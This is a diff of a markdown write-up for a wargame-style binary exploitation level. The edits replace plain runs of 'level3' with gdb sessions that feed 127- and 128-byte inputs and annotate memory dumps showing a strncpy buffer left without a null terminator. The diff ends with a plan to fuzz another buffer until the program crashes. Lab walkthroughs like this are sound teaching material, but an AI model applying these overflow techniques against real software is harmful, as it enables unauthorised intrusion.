@@ -98,11 +98,8 @@ Fine! By fulling the `buf2` buffer w/o null byte, it's possible to overflow the 
 ```
 
 ```bash
-level3@lxc-pwn-x86:/levels$ ./level3 A `python -c 'print "\x42" * 127'`
-String result: BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBA
-```
-
-```bash
+(gdb) r A `python -c 'print "\x42" * 127'`
+(...)
 Breakpoint 2, main (argc=3, argv=0xffffdc94) at level3.c:31
 31		concat(buf, buf2, buf1);
 (gdb) x/100wx $eax-100
@@ -120,15 +117,12 @@ Breakpoint 2, main (argc=3, argv=0xffffdc94) at level3.c:31
 0xffffda3c:	0x42424242	0x42424242	0x42424242	0x42424242
 0xffffda4c:	0x42424242	0x42424242	0x42424242	0x42424242
 0xffffda5c:	0x42424242	0x42424242	0x42424242	0x42424242
-0xffffda6c:	0x00000000	0x00000041	0x00000000	0x00000000 <---------- *
+0xffffda6c:	0x00424242  0x00000041	0x00000000	0x00000000 <---------- * 128th byte is null
 ```
 
 ```bash
-level3@lxc-pwn-x86:/levels$ ./level3 A `python -c 'print "\x42" * 128'`
-String result: BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAA
-```
-
-```bash
+(gdb) r A `python -c 'print "\x42" * 128'`
+...
 Breakpoint 2, main (argc=3, argv=0xffffdc94) at level3.c:31
 31		concat(buf, buf2, buf1);
 (gdb) x/100wx $eax-100
@@ -146,7 +140,7 @@ Breakpoint 2, main (argc=3, argv=0xffffdc94) at level3.c:31
 0xffffda3c:	0x42424242	0x42424242	0x42424242	0x42424242
 0xffffda4c:	0x42424242	0x42424242	0x42424242	0x42424242
 0xffffda5c:	0x42424242	0x42424242	0x42424242	0x42424242
-0xffffda6c:	0x42424242	0x00000041	0x00000000	0x00000000 <---------- *
+0xffffda6c:	0x42424242	0x00000041	0x00000000	0x00000000 <---------- * 128th byte is \x42
 ```
 
 Since `buf2` has to be exactly 128-byte w/o null char (e.g.: bigger values are just going to be ignored by `strncpy` function), let's play w/ `buf1` and fuzz values to crash the program.
